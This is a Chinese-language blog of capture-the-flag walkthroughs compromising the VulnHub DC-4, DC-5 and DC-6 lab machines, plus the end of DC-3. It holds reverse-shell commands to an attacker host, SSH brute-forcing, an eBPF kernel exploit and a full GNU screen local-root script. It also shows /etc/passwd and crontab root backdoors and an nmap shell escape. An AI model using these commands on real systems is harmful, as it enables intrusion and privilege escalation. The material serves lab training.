                                [...]
                        }
                }
                [...]
        }


__bpf_map_get contains the following code:

/* if error is returned, fd is released.
 * On success caller should complete fd access with matching fdput()
 */
struct bpf_map *__bpf_map_get(struct fd f)
{
        if (!f.file)
                return ERR_PTR(-EBADF);
        if (f.file->f_op != &bpf_map_fops) {
                fdput(f);
                return ERR_PTR(-EINVAL);
        }

        return f.file->private_data;
}

The problem is that when the caller supplies a file descriptor number referring
to a struct file that is not an eBPF map, both __bpf_map_get() and
replace_map_fd_with_map_ptr() will call fdput() on the struct fd. If
__fget_light() detected that the file descriptor table is shared with another
task and therefore the FDPUT_FPUT flag is set in the struct fd, this will cause
the reference count of the struct file to be over-decremented, allowing an
attacker to create a use-after-free situation where a struct file is freed
although there are still references to it.

A simple proof of concept that causes oopses/crashes on a kernel compiled with
memory debugging options is attached as crasher.tar.


One way to exploit this issue is to create a writable file descriptor, start a
write operation on it, wait for the kernel to verify the file's writability,
then free the writable file and open a readonly file that is allocated in the
same place before the kernel writes into the freed file, allowing an attacker
to write data to a readonly file. By e.g. writing to /etc/crontab, root
privileges can then be obtained.

There are two problems with this approach:

The attacker should ideally be able to determine whether a newly allocated
struct file is located at the same address as the previously freed one. Linux
provides a syscall that performs exactly this comparison for the caller:
kcmp(getpid(), getpid(), KCMP_FILE, uaf_fd, new_fd).

In order to make exploitation more reliable, the attacker should be able to
pause code execution in the kernel between the writability check of the target
file and the actual write operation. This can be done by abusing the writev()
syscall and FUSE: The attacker mounts a FUSE filesystem that artificially delays
read accesses, then mmap()s a file containing a struct iovec from that FUSE
filesystem and passes the result of mmap() to writev(). (Another way to do this
would be to use the userfaultfd() syscall.)

writev() calls do_writev(), which looks up the struct file * corresponding to
the file descriptor number and then calls vfs_writev(). vfs_writev() verifies
that the target file is writable, then calls do_readv_writev(), which first
copies the struct iovec from userspace using import_iovec(), then performs the
rest of the write operation. Because import_iovec() performs a userspace memory
access, it may have to wait for pages to be faulted in - and in this case, it
has to wait for the attacker-owned FUSE filesystem to resolve the pagefault,
allowing the attacker to suspend code execution in the kernel at that point
arbitrarily.

An exploit that puts all this together is in exploit.tar. Usage:

user@host:~/ebpf_mapfd_doubleput$ ./compile.sh
user@host:~/ebpf_mapfd_doubleput$ ./doubleput
starting writev
woohoo, got pointer reuse
writev returned successfully. if this worked, you'll have a root shell in <=60 seconds.
suid file detected, launching rootshell...
we have root privs now...
root@host:~/ebpf_mapfd_doubleput# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare),999(vboxsf),1000(user)

This exploit was tested on a Ubuntu 16.04 Desktop system.

Fix: https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=8358b02bf67d3a5d8a825070e1aa73f25fb2e4c7


Proof of Concept: https://bugs.chromium.org/p/project-zero/issues/attachment?aid=232552
Exploit-DB Mirror: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip
```

提示有exp的地址，下载

```
https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip
```

解压上传到靶机目录，解压

```
tar -xf exploit.tar
cd ebpf_mapfd_doubleput_exploit
./compile.sh
```

先反弹一下交互形的shell  
创建一个phpshell.php文件，写入

```
<?php
system("$sock=fsockopen(\"192.168.124.139\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");");
?>
```

kali端

```
netcat -l -p 4444
```

蚁剑执行

```
php phpshell.php
```

![upload successful](https://lnng.top/images/pasted-176.png)

**upload successful**

  
kali收到反弹的shell

![upload successful](https://lnng.top/images/pasted-177.png)

**upload successful**

  
执行刚刚编译的exp

![upload successful](https://lnng.top/images/pasted-178.png)

**upload successful**

  
提权成功  
寻找flag root下

![upload successful](https://lnng.top/images/pasted-179.png)

**upload successful**

  
成功获得flag

```
 __        __   _ _   ____                   _ _ _ _ 
 \ \      / /__| | | |  _ \  ___  _ __   ___| | | | |
  \ \ /\ / / _ \ | | | | | |/ _ \| '_ \ / _ \ | | | |
   \ V  V /  __/ | | | |_| | (_) | | | |  __/_|_|_|_|
    \_/\_/ \___|_|_| |____/ \___/|_| |_|\___(_|_|_|_)


Congratulations are in order.  :-)

I hope you've enjoyed this challenge as I enjoyed making it.

If there are any ways that I can improve these little challenges,
please let me know.

As per usual, comments and complaints can be sent via Twitter to @DCAU7

Have a great day!!!!
```

### [](https://lnng.top/posts/2ea3.html#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0-2 "参考文章")参考文章

[https://www.cnblogs.com/yurang/p/12735286.html](https://www.cnblogs.com/yurang/p/12735286.html)

[https://www.exploit-db.com/exploits/44227](https://www.exploit-db.com/exploits/44227)

## [](https://lnng.top/posts/2ea3.html#DC4 "DC4")DC4

### [](https://lnng.top/posts/2ea3.html#%E9%9D%B6%E5%9C%BA%E7%9A%84%E6%90%AD%E5%BB%BA "靶场的搭建")靶场的搭建

靶场下载地址:[https://download.vulnhub.com/dc/DC-4.zip](https://download.vulnhub.com/dc/DC-4.zip)

### [](https://lnng.top/posts/2ea3.html#%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-2 "基本信息收集")基本信息收集

nmap扫描网段

```
nmap -sS -A 192.168.124.0/24
```

```
Nmap scan report for 192.168.124.148
Host is up (0.00022s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 8d:60:57:06:6c:27:e0:2f:76:2c:e6:42:c0:01:ba:25 (RSA)
|   256 e7:83:8c:d7:bb:84:f3:2e:e8:a2:5f:79:6f:8e:19:30 (ECDSA)
|_  256 fd:39:47:8a:5e:58:33:99:73:73:9e:22:7f:90:4f:4b (ED25519)
80/tcp open  http    nginx 1.15.10
|_http-server-header: nginx/1.15.10
|_http-title: System Tools
MAC Address: 00:0C:29:40:C9:C1 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.22 ms 192.168.124.148
```

得到基本信息开放了80，ssh端口，操作系统Debian  
先爆破一下ssh吧(无结果)

```
nmap --script=ssh-brute 192.168.124.148
```

查看80端口，发现不是cms，是个登录框，提醒admin登录  

![upload successful](https://lnng.top/images/pasted-180.png)

**upload successful**

  
尝试sql,burpsuite跑一下字典没结果，那我再跑一下看看有过滤没(我丢还是啥结果没有)，看来没有注入呀  

![upload successful](https://lnng.top/images/pasted-181.png)

**upload successful**

  

![upload successful](https://lnng.top/images/pasted-182.png)

**upload successful**

  
让我百度一下题解，我丢，暴力破解密码可还行，那是时候祭出我100w的大字典了(heng!)  
再见没爆破出来直接看答案(我一点也不happy)，看来字典有的落后了

```
账号:admin
密码:happy
```

### [](https://lnng.top/posts/2ea3.html#%E7%99%BB%E5%BD%95%E8%BF%9B%E5%8E%BB "登录进去")登录进去

尝试登录发现是个命令执行功能，抓包看看，更改一下ls，发现能读取文件，那先读取comment看看是怎么执行的  

![upload successful](https://lnng.top/images/pasted-183.png)

**upload successful**

![upload successful](https://lnng.top/images/pasted-184.png)

**upload successful**

  
我丢，直接shell_exec(),那直接反弹shell

```
nc 192.168.124.139 4444 -e /bin/bash
kali端
netcat -l -p 4444
```

![upload successful](https://lnng.top/images/pasted-185.png)

**upload successful**

  
反弹一下交互shell

```
python -c 'import pty;pty.spawn("/bin/sh")'
```

![upload successful](https://lnng.top/images/pasted-187.png)

**upload successful**

### [](https://lnng.top/posts/2ea3.html#%E5%8F%91%E7%8E%B0%E5%AF%86%E7%A0%81 "发现密码")发现密码

在下面目录发现old-passwords.bak

/home/jim/backups  
说是old密码,打开

```
cat old-passwords.bak
000000
12345
iloveyou
1q2w3e4r5t
1234
123456a
qwertyuiop
monkey
123321
dragon
654321
666666
123
myspace1
a123456
121212
1qaz2wsx
123qwe
123abc
tinkle
target123
gwerty
1g2w3e4r
gwerty123
zag12wsx
7777777
qwerty1
1q2w3e4r
987654321
222222
qwe123
qwerty123
zxcvbnm
555555
112233
fuckyou
asdfghjkl
12345a
123123123
1q2w3e
qazwsx
loveme1
juventus
jennifer1
!~!1
bubbles
samuel
fuckoff
lovers
cheese1
0123456
123asd
999999999
madison
elizabeth1
music
buster1
lauren
david1
tigger1
123qweasd
taylor1
carlos
tinkerbell
samantha1
Sojdlg123aljg
joshua1
poop
stella
myspace123
asdasd5
freedom1
whatever1
xxxxxx
00000
valentina
a1b2c3
741852963
austin
monica
qaz123
lovely1
music1
harley1
family1
spongebob1
steven
nirvana
1234abcd
hellokitty
thomas1
cooper
520520
muffin
christian1
love13
fucku2
arsenal1
lucky7
diablo
apples
george1
babyboy1
crystal
1122334455
player1
aa123456
vfhbyf
forever1
Password
winston
chivas1
sexy
hockey1
1a2b3c4d
pussy
playboy1
stalker
cherry
tweety
toyota
creative
gemini
pretty1
maverick
brittany1
nathan1
letmein1
cameron1
secret1
google1
heaven
martina
murphy
spongebob
uQA9Ebw445
fernando
pretty
startfinding
softball
dolphin1
fuckme
test123
qwerty1234
kobe24
alejandro
adrian
september
aaaaaa1
bubba1
isabella
abc123456
password3
jason1
abcdefg123
loveyou1
shannon
100200
manuel
leonardo
molly1
flowers
123456z
007007
password.
321321
miguel
samsung1
sergey
sweet1
abc1234
windows
qwert123
vfrcbv
poohbear
d123456
school1
badboy
951753
123456c
111
steven1
snoopy1
garfield
YAgjecc826
compaq
candy1
sarah1
qwerty123456
123456l
eminem1
141414
789789
maria
steelers
iloveme1
morgan1
winner
boomer
lolita
nastya
alexis1
carmen
angelo
nicholas1
portugal
precious
jackass1
jonathan1
yfnfif
bitch
tiffany
rabbit
rainbow1
angel123
popcorn
barbara
brandy
starwars1
barney
natalia
jibril04
hiphop
tiffany1
shorty
poohbear1
simone
albert
marlboro
hardcore
cowboys
sydney
alex
scorpio
1234512345
q12345
qq123456
onelove
bond007
abcdefg1
eagles
crystal1
azertyuiop
winter
sexy12
angelina
james
svetlana
fatima
123456k
icecream
popcorn1
```

生成爆破字典，爆破ssh  
使用hydra，进行爆破,hydra是著名黑客组织thc的一款开源的暴力密码破解工具，可以在线破解多种密码。

```
破解ssh： 
hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns ip ssh 
hydra -l 用户名 -p 密码字典 -t 线程 -o save.log -vV ip ssh 
破解ftp： 
hydra ip ftp -l 用户名 -P 密码字典 -t 线程(默认16) -vV 
hydra ip ftp -l 用户名 -P 密码字典 -e ns -vV 
```

```
爆破ssh
hydra -l jim -P passwd.txt -t 10 ssh://192.168.124.148
```

### [](https://lnng.top/posts/2ea3.html#%E7%88%86%E5%87%BAssh%E7%99%BB%E5%BD%95%E5%AF%86%E7%A0%81 "爆出ssh登录密码")爆出ssh登录密码

```
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-11-10 08:38:19
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 10 tasks per 1 server, overall 10 tasks, 252 login tries (l:1/p:252), ~26 tries per task
[DATA] attacking ssh://192.168.124.148:22/
[STATUS] 110.00 tries/min, 110 tries in 00:01h, 142 to do in 00:02h, 10 active



[STATUS] 80.00 tries/min, 160 tries in 00:02h, 92 to do in 00:02h, 10 active                                                      
[22][ssh] host: 192.168.124.148   login: jim   password: jibril04                                                                 
1 of 1 target successfully completed, 1 valid password found                                                                      
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-11-10 08:41:16
```

ssh账号:jim密码:jibril04

![upload successful](https://lnng.top/images/pasted-189.png)

**upload successful**

### [](https://lnng.top/posts/2ea3.html#%E6%8F%90%E7%A4%BA%E6%9C%89%E4%B8%AAmail "提示有个mail")提示有个mail

读取一下信封

```
/var/mail/jim
```

告诉了我们账号密码  

![upload successful](https://lnng.top/images/pasted-190.png)

**upload successful**

```
Password is:  ^xHhA&hvim0y

See ya,
Charles
```

切换一下用户

```
su charles
```

查看能够root执行的命令

```
sudo -l
```

![upload successful](https://lnng.top/images/pasted-191.png)

**upload successful**

  
发有能够以root执行的teehee命令,而teehee的作用是可以向文件中追加内容

### [](https://lnng.top/posts/2ea3.html#%E6%8F%90%E6%9D%83 "提权")提权

#### [](https://lnng.top/posts/2ea3.html#%E5%B0%86%E8%B4%A6%E5%8F%B7%E5%86%99%E5%85%A5-etc-passwd%E4%B8%AD "将账号写入/etc/passwd中")将账号写入/etc/passwd中

密码设置为空

```
echo "admin::0:0:::/bin/bash" | sudo teehee -a /etc/passwd
```

对于admin::0:0:::/bin/bash的解释

```
[用户名]：[密码]：[UID]：[GID]：[身份描述]：[主目录]：[登录shell]
```

[参考文章](https://www.cnblogs.com/backlion/p/10503978.html)  

![upload successful](https://lnng.top/images/pasted-192.png)

**upload successful**

  
也可以不将密码设置为空

```
mkpasswd -m SHA-512 12345
```

![upload successful](https://lnng.top/images/pasted-195.png)

**upload successful**

  
然后

```
sudo teehee -a /etc/passwd 12345:$6$OXVv4N3qtVc0LQeI$CPmgAD9tTpzpCu86IaC9gIx6MYta8/huc3utEd3WwyhUWSbDxKIwi/3XCAHjOqn.rT/lamYZTxbKDoJXkxXaa1:0:0:::/bin/bash
```

其中-e 类似等于>>  
然后切换用户  

![upload successful](https://lnng.top/images/pasted-196.png)

**upload successful**

  

![upload successful](https://lnng.top/images/pasted-197.png)

**upload successful**

```
cat /root/flag.txt
```

```

888       888          888 888      8888888b.                             888 888 888 888 
888   o   888          888 888      888  "Y88b                            888 888 888 888 
888  d8b  888          888 888      888    888                            888 888 888 888 
888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888 
888d88888b888 d8P  Y8b 888 888      888    888 d88""88b 888 "88b d8P  Y8b 888 888 888 888 
88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P 
8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      "   "   "   "  
888P     Y888  "Y8888  888 888      8888888P"   "Y88P"  888  888  "Y8888  888 888 888 888 


Congratulations!!!

Hope you enjoyed DC-4.  Just wanted to send a big thanks out there to all those
who have provided feedback, and who have taken time to complete these little
challenges.

If you enjoyed this CTF, send me a tweet via @DCAU7.
```

##### [](https://lnng.top/posts/2ea3.html#%E5%86%99%E5%85%A5%E5%AE%9A%E6%97%B6%E6%96%87%E4%BB%B6-etc-crontab "写入定时文件/etc/crontab")写入定时文件/etc/crontab

向/etc/crontab文件中写入新的定时任务

时间部分全部填写为*，意思是每分钟执行一次，通过写入将/bin/sh的权限修改为4777，这样就可以在非root用户下执行它，并且执行期间拥有root权限。

```
sudo teehee /etc/crontab
* * * * * root chmod 4777 /bin/sh
```

![upload successful](https://lnng.top/images/pasted-198.png)

**upload successful**

### [](https://lnng.top/posts/2ea3.html#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0-3 "参考文章")参考文章

[安全客](https://www.anquanke.com/post/id/178658#h3-5)

[https://www.cnblogs.com/yurang/p/13721862.html](https://www.cnblogs.com/yurang/p/13721862.html)

## [](https://lnng.top/posts/2ea3.html#DC5 "DC5")DC5

### [](https://lnng.top/posts/2ea3.html#%E5%9F%BA%E6%9C%AC%E7%8E%AF%E5%A2%83%E7%9A%84%E6%90%AD%E5%BB%BA "基本环境的搭建")基本环境的搭建

靶机下载地址：[https://download.vulnhub.com/dc/DC-5.zip](https://download.vulnhub.com/dc/DC-5.zip)

### [](https://lnng.top/posts/2ea3.html#%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-3 "基本信息收集")基本信息收集

```
nmap -sS -A 192.168.124.0/24
```

```
Nmap scan report for 192.168.124.149
Host is up (0.00027s latency).
Not shown: 998 closed ports
PORT    STATE SERVICE VERSION
80/tcp  open  http    nginx 1.6.2
|_http-server-header: nginx/1.6.2
|_http-title: Welcome
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          37412/udp   status
|   100024  1          49448/tcp6  status
|   100024  1          49885/udp6  status
|_  100024  1          56530/tcp   status
MAC Address: 00:0C:29:1A:8C:74 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.27 ms 192.168.124.149

Nmap scan report for 192.168.124.254
```

发现开了80,111端口，操作系统是linux，nginx 1.6.2  
对端口进一步探测

```
nmap -sS 192.168.124.149 -p 1-65535
```

```
Nmap scan report for 192.168.124.149
Host is up (0.00089s latency).
Not shown: 65532 closed ports
PORT      STATE SERVICE
80/tcp    open  http
111/tcp   open  rpcbind
56530/tcp open  unknown
MAC Address: 00:0C:29:1A:8C:74 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 2.46 seconds
```

开了56530端口  
进入80端口查看  

![upload successful](https://lnng.top/images/pasted-199.png)

**upload successful**

### [](https://lnng.top/posts/2ea3.html#%E5%8F%91%E7%8E%B0%E4%B8%80%E4%B8%AA%E7%95%99%E8%A8%80%E5%8A%9F%E8%83%BD "发现一个留言功能")发现一个留言功能

尝试了xss发现并没有  
扫描一下目录，发现特别的footer.php  

![upload successful](https://lnng.top/images/pasted-200.png)

**upload successful**

  
访问发现日期总在变  

![upload successful](https://lnng.top/images/pasted-201.png)

**upload successful**

  
发现留言的地方的日期也总在变  

![upload successful](https://lnng.top/images/pasted-202.png)

**upload successful**

  
然后thankyou.php应该是包含了footer.php页面  
尝试文件包含读取thankyou.php文件和其他文件，发现能够成功读取

![upload successful](https://lnng.top/images/pasted-204.png)

**upload successful**

  

![upload successful](https://lnng.top/images/pasted-203.png)

**upload successful**

  
尝试写入文件进行文件包含，能写入的文件像中间件日志文件，ssh登录的日志文件，临时文件等等  
参考之前的文件包含[https://lnng.top/posts/6b68.html](https://lnng.top/posts/6b68.html)  
这个还是尝试包含中间件的日志文件吧，因为ssh的登录端口不知，且其他的方法不好利用  
随便访问一个木马  

![upload successful](https://lnng.top/images/pasted-205.png)

**upload successful**

  
蚁剑连接发现连接成功  

![upload successful](https://lnng.top/images/pasted-206.png)

**upload successful**

### [](https://lnng.top/posts/2ea3.html#%E5%8F%8D%E5%BC%B9%E4%BA%A4%E4%BA%92shell "反弹交互shell")反弹交互shell

在/var/tmp/下新建phpshell文件，写入

```
<?php
system("nc 192.168.124.139 4444 -e /bin/sh");
?>
```

kali端

```
nc -l -p 4444
```

反弹shell

```
python -c 'import pty;pty.spawn("/bin/bash")'
```

![upload successful](https://lnng.top/images/pasted-207.png)

**upload successful**

### [](https://lnng.top/posts/2ea3.html#%E6%8F%90%E6%9D%83-1 "提权")提权

尝试suid提权

```
find / -perm -u=s -type f 2>/dev/null
```

![upload successful](https://lnng.top/images/pasted-208.png)

**upload successful**

  
GNU Screen是一款由GNU计划开发的用于命令行终端切换的自由软件。用户可以通过该软件同时连接多个本地或远程的命令行会话，并在其间自由切换。  
GNU Screen可以看作是窗口管理器的命令行界面版本。它提供了统一的管理多个会话的界面和相应的功能。  
搜索漏洞

```
searchsploit screen 4.5.0
```

发现两个可利用的漏洞  

![upload successful](https://lnng.top/images/pasted-209.png)

**upload successful**

  
使用第一个  
先将41154.sh复制到桌面

```
cp /usr/share/exploitdb/exploits/linux/local/41154.sh 41154.sh

cat 41154.sh
```

```
#!/bin/bash
# screenroot.sh
# setuid screen v4.5.0 local root exploit
# abuses ld.so.preload overwriting to get root.
# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html
# HACK THE PLANET
# ~ infodox (25/1/2017) 
echo "~ gnu/screenroot ~"
echo "[+] First, we create our shell and library..."
cat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
rm -f /tmp/libhax.c
cat << EOF > /tmp/rootshell.c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF
gcc -o /tmp/rootshell /tmp/rootshell.c
rm -f /tmp/rootshell.c
echo "[+] Now we create our /etc/ld.so.preload file..."
cd /etc
umask 000 # because
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
echo "[+] Triggering..."
screen -ls # screen itself is setuid, so... 
```

这里告诉了我们使用方法  
先将第一部分写入libhax.c文件中

```
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
```

然后编译

```
gcc -fPIC -shared -ldl -o libhax.so libhax.c
```

![upload successful](https://lnng.top/images/pasted-210.png)

**upload successful**

  
将中间的代码存入rootshell.c中

```
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
```

然后编译

```
gcc -o rootshell rootshell.c
```

![upload successful](https://lnng.top/images/pasted-211.png)

**upload successful**

  
将剩余代码保存到dc5.sh

```
echo "[+] Now we create our /etc/ld.so.preload file..."
cd /etc
umask 000 # because
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
echo "[+] Triggering..."
screen -ls # screen itself is setuid, so...
/tmp/rootshell
```

并输入:

```
set ff=unix
```

![upload successful](https://lnng.top/images/pasted-212.png)

**upload successful**

  
将三个文件上传到/tmp文件中  
然后修改dc5.sh的权限

```
chmod 777 dc5.sh
```

然后执行

```
./dc5.sh
```

![upload successful](https://lnng.top/images/pasted-213.png)

**upload successful**

  
读取flag  

![upload successful](https://lnng.top/images/pasted-214.png)

**upload successful**

```
cat thisistheflag.txt                                                                                                             


888b    888 d8b                                                      888      888 888 888                                         
8888b   888 Y8P                                                      888      888 888 888                                         
88888b  888                                                          888      888 888 888                                         
888Y88b 888 888  .d8888b .d88b.       888  888  888  .d88b.  888d888 888  888 888 888 888                                         
888 Y88b888 888 d88P"   d8P  Y8b      888  888  888 d88""88b 888P"   888 .88P 888 888 888                                         
888  Y88888 888 888     88888888      888  888  888 888  888 888     888888K  Y8P Y8P Y8P                                         
888   Y8888 888 Y88b.   Y8b.          Y88b 888 d88P Y88..88P 888     888 "88b  "   "   "                                          
888    Y888 888  "Y8888P "Y8888        "Y8888888P"   "Y88P"  888     888  888 888 888 888                                         




Once again, a big thanks to all those who do these little challenges,
and especially all those who give me feedback - again, it's all greatly
appreciated.  :-)

I also want to send a big thanks to all those who find the vulnerabilities
and create the exploits that make these challenges possible.
```

### [](https://lnng.top/posts/2ea3.html#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0-4 "参考文章")参考文章

[https://www.jianshu.com/p/8f6e1e4d44b9](https://www.jianshu.com/p/8f6e1e4d44b9)  
[https://www.anquanke.com/post/id/178958](https://www.anquanke.com/post/id/178958)

## [](https://lnng.top/posts/2ea3.html#DC6 "DC6")DC6

### [](https://lnng.top/posts/2ea3.html#%E5%9F%BA%E6%9C%AC%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA-1 "基本环境搭建")基本环境搭建

靶机下载地址:[https://download.vulnhub.com/dc/DC-6.zip](https://download.vulnhub.com/dc/DC-6.zip)

### [](https://lnng.top/posts/2ea3.html#%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-4 "基本信息收集")基本信息收集

```
 nmap -sS -A 192.168.124.0/24
```

```
 Nmap scan report for 192.168.124.150
Host is up (0.00049s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 3e:52:ce:ce:01:b6:94:eb:7b:03:7d:be:08:7f:5f:fd (RSA)
|   256 3c:83:65:71:dd:73:d7:23:f8:83:0d:e3:46:bc:b5:6f (ECDSA)
|_  256 41:89:9e:85:ae:30:5b:e0:8f:a4:68:71:06:b4:15:ee (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Did not follow redirect to http://wordy/
|_https-redirect: ERROR: Script execution failed (use -d to debug)
MAC Address: 00:0C:29:4C:2C:9C (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.49 ms 192.168.124.150
```

发现开放了80，22ssh端口，操作系统linux  
对端口进一步扫描

```
nmap -sS 192.168.124.150 -p 1-65535
```

```
Not shown: 65533 closed ports                                                                                                     
PORT   STATE SERVICE                                                                                                              
22/tcp open  ssh                                                                                                                  
80/tcp open  http                                                                                                                     
```

没有新的端口  
爆破一下ssh(爆破未成功)

```
nmap --script=ssh-brute 192.168.124.150
```

### [](https://lnng.top/posts/2ea3.html#%E8%AE%BF%E9%97%AE80%E7%AB%AF%E5%8F%A3-1 "访问80端口")访问80端口

发现80端口访问不了，被重定向的wordy页面和之前一样  
修改本地的dns

```
linux:
vim /etc/hosts
windows:
C:\Windows\System32\drivers\etc
```

添加

```
192.168.124.150 wordy
```

根据个人ip  
插件识别是一个wordpress+apache环境  

![upload successful](https://lnng.top/images/pasted-236.png)

**upload successful**

  
那和之前一样用wpscan扫描

```
wpscan --url http://wordy/ --enumerate u
```

扫描出几个用户名

![upload successful](https://lnng.top/images/pasted-237.png)

**upload successful**

  
将其保存到usename.txt文件  
然后有个提示妈耶鬼能想到  
提示地址:[https://www.vulnhub.com/entry/dc-6,315/](https://www.vulnhub.com/entry/dc-6,315/)  

![upload successful](https://lnng.top/images/pasted-238.png)

**upload successful**

```
cat /usr/share/wordlists/rockyou.txt | grep k01 > password.txt
```

然后进行爆破

```
wpscan --url http://wordy/ -U username.txt -P password.txt
```

![upload successful](https://lnng.top/images/pasted-240.png)

**upload successful**

  
成功爆破出账号和密码

```
mark / helpdesk01
```

登录地址

```
http://wordy/wp-admin/
```

![upload successful](https://lnng.top/images/pasted-241.png)

**upload successful**

  
搜索漏洞:  
[https://www.exploit-db.com/exploits/45274](https://www.exploit-db.com/exploits/45274)

发现一个命令执行，漏洞地址  
[http://wordy/wp-admin/admin.php?page=plainview_activity_monitor&tab=activity_tools](http://wordy/wp-admin/admin.php?page=plainview_activity_monitor&tab=activity_tools)  

![upload successful](https://lnng.top/images/pasted-242.png)

**upload successful**

  
kali开启监听端口

```
netcat -l -p 4444
```

这个位置修改命令执行反弹shell  

![upload successful](https://lnng.top/images/pasted-243.png)

**upload successful**

```
baidu.com | nc -e /bin/bash 192.168.124.139 4444
```

反弹一下交互shell

```
python -c 'import pty;pty.spawn("/bin/bash")'
```

![upload successful](https://lnng.top/images/pasted-245.png)

**upload successful**

### [](https://lnng.top/posts/2ea3.html#%E6%8F%90%E6%9D%83-2 "提权")提权

在家目录发现提示的ssh登录

```
/home/mark/stuff
```

发现登录账号密码

```
Things to do:

- Restore full functionality for the hyperdrive (need to speak to Jens)
- Buy present for Sarah's farewell party
- Add new user: graham - GSo7isUM1D4 - done
- Apply for the OSCP course
- Buy new laptop for Sarah's replacement
```

ssh登录  

![upload successful](https://lnng.top/images/pasted-246.png)

**upload successful**

  
尝试suid提取,发现没有可利用的

```
find / -perm -u=s -type f 2>/dev/null
```

查看当前用户可执行操作

```
sudo -l                                                                                    
```

![upload successful](https://lnng.top/images/pasted-247.png)

**upload successful**

  
发现可操作/home/jens/backups.sh，打开发现是一个解压的脚本  

![upload successful](https://lnng.top/images/pasted-248.png)

**upload successful**

  
向其中写入命令然后已jens来执行

```
echo "/bin/bash" >> /home/jens/backups.sh
sudo -u jens /home/jens/backups.sh
```

![upload successful](https://lnng.top/images/pasted-249.png)

**upload successful**

发现成功切换到jens用户  
继续查看可执行的命令,发现可执行的root的nmap

```
sudo -l
```

![upload successful](https://lnng.top/images/pasted-250.png)

**upload successful**

  
所以需要nmap打开一个shell即可获得root

nmap中执行shell方法

```
echo "os.execute('/bin/bash')">/tmp/shell.nse
sudo nmap --script=/tmp/shell.nse
```

```
cat ./theflag.txt
```

成功获得flag

```
Yb        dP 888888 88     88         8888b.   dP"Yb  88b 88 888888 d8b 
 Yb  db  dP  88__   88     88          8I  Yb dP   Yb 88Yb88 88__   Y8P 
  YbdPYbdP   88""   88  .o 88  .o      8I  dY Yb   dP 88 Y88 88""   `"' 
   YP  YP    888888 88ood8 88ood8     8888Y"   YbodP  88  Y8 888888 (8) 


Congratulations!!!

Hope you enjoyed DC-6.  Just wanted to send a big thanks out there to all those
who have provided feedback, and who have taken time to complete these little
challenges.

If you enjoyed this CTF, send me a tweet via @DCAU7.
```

